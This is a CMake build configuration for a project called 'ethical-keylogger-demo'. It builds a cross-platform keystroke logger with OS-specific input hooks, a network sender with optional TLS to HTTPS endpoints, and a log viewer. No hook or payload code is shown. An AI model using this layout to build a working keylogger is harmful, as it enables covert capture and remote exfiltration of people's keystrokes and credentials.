cmake_minimum_required(VERSION 3.16)
project(ethical-keylogger-demo VERSION 0.1.0 LANGUAGES CXX)

if(APPLE)
    enable_language(OBJCXX)
endif()

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

set(SOURCES
    src/main.cpp
    src/logger.cpp
    src/service.cpp
    src/net_common.cpp
    src/net_sender.cpp
    src/viewer.cpp
    src/platform/keylogger_factory.cpp
    # Platform-specific sources (uncomment when implemented):
    # src/platform/windows_hook.cpp   # WIN32 only (superseded by keylogger_win.cpp)
    # src/platform/macos_hook.cpp     # APPLE only
)

if(WIN32)
    list(APPEND SOURCES src/platform/keylogger_win.cpp)
elseif(APPLE)
    list(APPEND SOURCES src/platform/keylogger_mac.mm)
elseif(CMAKE_SYSTEM_NAME STREQUAL "Linux")
    list(APPEND SOURCES src/platform/keylogger_linux.cpp)
endif()

add_executable(keylogger ${SOURCES})
add_executable(log_viewer src/log_viewer.cpp)

# Threads are needed everywhere for the net sender and viewer worker threads.
find_package(Threads REQUIRED)
target_link_libraries(keylogger PRIVATE Threads::Threads)

# Optional TLS support via OpenSSL (auto-detected; HTTPS endpoints and the
# viewer's --tls-cert/--tls-key flags require this).
find_package(OpenSSL QUIET)
if(OpenSSL_FOUND)
    target_compile_definitions(keylogger PRIVATE KEYLOGGER_HAS_TLS=1)
    target_link_libraries(keylogger PRIVATE OpenSSL::SSL OpenSSL::Crypto)
    message(STATUS "ethical-keylogger: TLS support enabled (OpenSSL ${OPENSSL_VERSION})")
else()
    message(STATUS "ethical-keylogger: TLS support disabled (OpenSSL not found); "
                   "https:// endpoints and viewer TLS will be rejected at runtime")
endif()

if(WIN32)
    target_link_libraries(keylogger PRIVATE user32 Ws2_32)
elseif(APPLE)
    find_library(APP_SERVICES ApplicationServices REQUIRED)
    find_library(CARBON Carbon REQUIRED)
    target_link_libraries(keylogger PRIVATE ${APP_SERVICES} ${CARBON})
endif()
